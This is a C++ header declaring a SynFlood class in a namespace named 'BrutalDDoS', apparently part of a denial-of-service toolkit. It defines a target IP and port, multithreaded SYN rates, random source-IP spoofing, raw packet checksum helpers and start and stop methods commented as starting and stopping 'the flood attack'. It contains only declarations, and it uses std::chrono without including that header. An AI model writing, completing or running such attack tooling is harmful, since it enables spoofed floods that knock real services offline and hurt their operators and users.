#ifndef SYN_FLOOD_H
#define SYN_FLOOD_H

#include <string>
#include <cstdint>
#include <atomic>
#include <thread>
#include <vector>
#include <functional>
#include <mutex>

// Forward declarations
struct sockaddr_in;

namespace BrutalDDoS {
namespace Network {
namespace Protocols {

class SynFlood {
public:
    // Configuration structure for SYN flood
    struct Config {
        std::string target_ip;
        uint16_t target_port;
        int num_threads;
        uint64_t syn_rate_per_second; // Total SYN packets per second across all threads
        bool spoof_ips;               // Enable IP spoofing
        bool verbose;                 // Enable logging
        
        // Optional: Source port range for spoofing
        uint16_t src_port_min = 1024;
        uint16_t src_port_max = 65535;
        
        // Optional: TTL for spoofed packets
        uint8_t ttl = 64;
    };

    SynFlood(const Config& config);
    ~SynFlood();

    // Start the flood attack
    void start();

    // Stop the flood attack gracefully
    void stop();

    // Get statistics
    struct Stats {
        uint64_t total_syn_sent = 0;
        uint64_t bytes_sent = 0;
        uint64_t errors = 0;
        double current_pps = 0.0;
        double current_bps = 0.0;
    };

    Stats get_stats() const;

private:
    // Thread worker function
    void worker_thread(int thread_id);

    // Generate a random source IP
    std::string generate_spoofed_ip();

    // Calculate IP checksum
    uint16_t ip_checksum(uint16_t* data, size_t length);

    // Calculate TCP checksum
    uint16_t tcp_checksum(uint16_t* data, size_t length, uint32_t src_ip, uint32_t dst_ip);

    // Send a single SYN packet
    bool send_syn_packet(const std::string& src_ip, uint16_t src_port, uint16_t dst_port);

    // Configuration
    Config config_;

    // Control flags
    std::atomic<bool> running_;
    std::atomic<bool> stopped_;

    // Threads
    std::vector<std::thread> threads_;

    // Statistics
    mutable std::mutex stats_mutex_;
    Stats current_stats_;
    
    // Time tracking for rate limiting
    std::chrono::steady_clock::time_point last_time_;
    uint64_t packets_this_second_;
};

} // namespace Protocols
} // namespace Network
} // namespace BrutalDDoS

#endif // SYN_FLOOD_H
